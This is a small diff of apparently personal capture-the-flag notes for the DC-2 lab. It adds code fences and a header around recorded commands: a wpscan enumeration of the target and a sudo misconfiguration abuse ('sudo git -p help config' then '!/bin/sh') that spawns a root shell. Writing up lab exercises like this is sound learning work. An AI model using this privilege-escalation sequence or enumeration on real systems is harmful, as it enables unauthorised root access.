@@ -5,9 +5,9 @@
 # 27/1/2023
 
 ----------------------------------------------------
-# nmap result
+# nmap result / exploitation
 ----------------------------------------------------
-
+```
 
 
 wpscan --url //dc-2 --enumerate p --enumerate t --enumerate u
@@ -28,3 +28,4 @@ sudo -l
 (root) NOPASSWD: /usr/bin/git
 sudo git -p help config
 !/bin/sh
+```
